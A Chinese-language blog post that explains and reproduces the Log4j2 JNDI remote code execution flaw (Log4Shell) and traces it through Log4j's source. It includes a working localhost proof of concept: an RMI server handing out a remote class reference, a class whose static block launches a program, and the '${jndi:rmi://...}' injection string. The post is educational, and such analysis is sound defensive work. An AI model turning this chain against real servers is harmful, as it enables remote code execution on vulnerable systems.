---
date: 2021-12-12
---



- [漏洞的前因后果](#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%89%8D%E5%9B%A0%E5%90%8E%E6%9E%9C)
    - [漏洞描述](#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0)
    - [漏洞评级](#%E6%BC%8F%E6%B4%9E%E8%AF%84%E7%BA%A7)
    - [影响版本](#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC)
    - [安全建议](#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE)
- [本地复现漏洞](#%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%E6%BC%8F%E6%B4%9E)
    - [本地打印 JVM 基础信息](#%E6%9C%AC%E5%9C%B0%E6%89%93%E5%8D%B0-jvm-%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF)
    - [本地获取服务器的打印信息](#%E6%9C%AC%E5%9C%B0%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%89%93%E5%8D%B0%E4%BF%A1%E6%81%AF)
- [log4j 漏洞源码分析](#log4j-%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90)
- [扩展：JNDI](#%E6%89%A9%E5%B1%95jndi)
- [危害是什么？](#%E5%8D%B1%E5%AE%B3%E6%98%AF%E4%BB%80%E4%B9%88)
- [GitHub 项目](#github-%E9%A1%B9%E7%9B%AE)
- [参考链接](#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5)

# 漏洞的前因后果

2021 年 12 月 9 日，2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。详情见 [【漏洞预警】Apache Log4j 远程代码执行漏洞
](https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw)

## 漏洞描述

Apache Log4j2 是一款优秀的 Java 日志框架。`2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。`由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink 等均受影响。阿里云应急响应中心提醒 Apache Log4j2 用户尽快采取安全措施阻止漏洞攻击。

## 漏洞评级

Apache Log4j 远程代码执行漏洞 `严重`。

## 影响版本

Apache Log4j 2.x <= 2.14.1

## 安全建议

1、升级 Apache Log4j2 所有相关应用到最新的 log4j-2.15.0-rc1 版本，地址 https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1

2、升级已知受影响的应用及组件，如 srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid。

# 本地复现漏洞

首先需要使用低版本的 log4j 包，我们在本地新建一个 Spring Boot 项目，使用 2.5.7 版本的 Spring Boot，可以看到一老的 log4j 是 2.14.1，可以复现漏洞。

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214165545.png)

参考 [Apache Log4j Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)，我们先使用代码在 log 里获取一下 java:vm。

## 本地打印 JVM 基础信息

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214165937.png?x-oss-process=style/yano)

```java
@SpringBootTest
class Log4jApplicationTests {

	private static final Logger logger = LogManager.getLogger(SpringBootTest.class);

	@Test
	void log4j() {
		logger.info("content {}", "${java:vm}");
	}
}
```

可以发现输出是：

```
content Java HotSpot(TM) 64-Bit Server VM (build 25.152-b16, mixed mode)
```

使用 JavaLookup 获取到了 JVM 的相关信息（需要使用`java`前缀）。

## 本地获取服务器的打印信息

本地启动一个 RMI 服务：

```java
public class Server {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        String url = "http://127.0.0.1:8081/";
        // Reference 需要传入三个参数 (className,factory,factoryLocation)
        // 第一个参数随意填写即可，第二个参数填写我们 http 服务下的类名，第三个参数填写我们的远程地址
        Reference reference = new Reference("ExecCalc", "ExecCalc", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("calc", referenceWrapper);
    }
}
```

ExecCalc 类直接放在根目录，不能申请包名，即不能存在 package xxx。声明后编译的 class 文件函数名称会加上包名从而不匹配。参考 [Java 安全-RMI-JNDI 注入](https://reader-l.github.io/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/)。

```java
public class ExecCalc {
    static {
        try {
            System.out.println("open a Calculator!");
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

之后启动上面的 Server 类，再执行下面的代码：

```java
@Test
void log4jEvil() {
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    logger.info("${jndi:rmi://127.0.0.1:1099/calc}");
}
```

发现测试用例的控制台输出了 `open a Calculator!` 并启动了计算器。

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214172950.png?x-oss-process=style/yano)

# log4j 漏洞源码分析

只看 `logger.info("${jndi:rmi://127.0.0.1:1099/calc}");` 这段代码，首先会调用到 org.apache.logging.log4j.core.config.LoggerConfig#processLogEvent：

```java
private void processLogEvent(final LogEvent event, final LoggerConfigPredicate predicate) {
    event.setIncludeLocation(isIncludeLocation());
    if (predicate.allow(this)) {
        callAppenders(event);
    }
    logParent(event, predicate);
}
```

其中 LogEvent 结构如下：

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214174231.png)

encode 对应的事件，将 ${param} 里的 param 解析出来，org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender#tryAppend

```java
private void tryAppend(final LogEvent event) {
    if (Constants.ENABLE_DIRECT_ENCODERS) {
        directEncodeEvent(event);
    } else {
        writeByteArrayToManager(event);
    }
}

protected void directEncodeEvent(final LogEvent event) {
    getLayout().encode(event, manager);
    if (this.immediateFlush || event.isEndOfBatch()) {
        manager.flush();
    }
}
```

调用 org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable，将对应参数解析出结果。

```java
protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                    final int startPos, final int endPos) {
    final StrLookup resolver = getVariableResolver();
    if (resolver == null) {
        return null;
    }
    return resolver.lookup(event, variableName);
}
```

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175321.png)

和官方文档上是能够对应上的，即 log 里只解析前缀为 `date`、`jndi` 等的命令，本文的测试用例使用的是 `${jndi:rmi://127.0.0.1:1099/calc}`。

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175427.png?x-oss-process=style/yano)

解析出参数的结果， org.apache.logging.log4j.core.lookup.Interpolator#lookup

```java
@Override
public String lookup(final LogEvent event, String var) {
    if (var == null) {
        return null;
    }

    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
    if (prefixPos >= 0) {
        final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);
        final String name = var.substring(prefixPos + 1);
        final StrLookup lookup = strLookupMap.get(prefix);
        if (lookup instanceof ConfigurationAware) {
            ((ConfigurationAware) lookup).setConfiguration(configuration);
        }
        String value = null;
        if (lookup != null) {
            value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
        }

        if (value != null) {
            return value;
        }
        var = var.substring(prefixPos + 1);
    }
    if (defaultLookup != null) {
        return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var);
    }
    return null;
}
```

其核心是这段代码：

```java
value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
```

org.apache.logging.log4j.core.lookup.JndiLookup#lookup

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175217.png)

接下来就是调用 javax.naming 的 JDK 相关代码，远程加载了 ExecCalc 类，在本地输出了 `open a Calculator!` 并启动了计算器。

# 扩展：JNDI

JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用 JNDI 在局域网上定位一台打印机，也可以用 JNDI 来定位数据库服务或一个远程 Java 对象。JNDI 底层支持 RMI 远程对象，RMI 注册的服务可以通过 JNDI 接口来访问和调用。

​JNDI 是应用程序设计的 Api，JNDI 可以根据名字动态加载数据，支持的服务主要有以下几种：DNS、LDAP、 CORBA 对象服务、RMI 等等。

其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。

![](http://yano.oss-cn-beijing.aliyuncs.com/blog/20211214184613.png)

# 危害是什么？

1. client 可以获取服务器的某些信息，通过 JNDI 远程加载类
2. client 向服务器注入恶意代码

# GitHub 项目

[Java 编程思想-最全思维导图-GitHub 下载链接](https://github.com/LjyYano/Thinking_in_Java_MindMapping)，需要的小伙伴可以自取~

原创不易，希望大家转载时请先联系我，并标注原文链接。

# 参考链接

- [Java 安全-RMI-JNDI 注入](https://reader-l.github.io/2021/01/26/Java%E5%AE%89%E5%85%A8-RMI-JNDI%E6%B3%A8%E5%85%A5/)
- [Lesson: Overview of JNDI](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html)
- [https://logging.apache.org/log4j/2.x/manual/lookups.html](https://logging.apache.org/log4j/2.x/manual/lookups.html)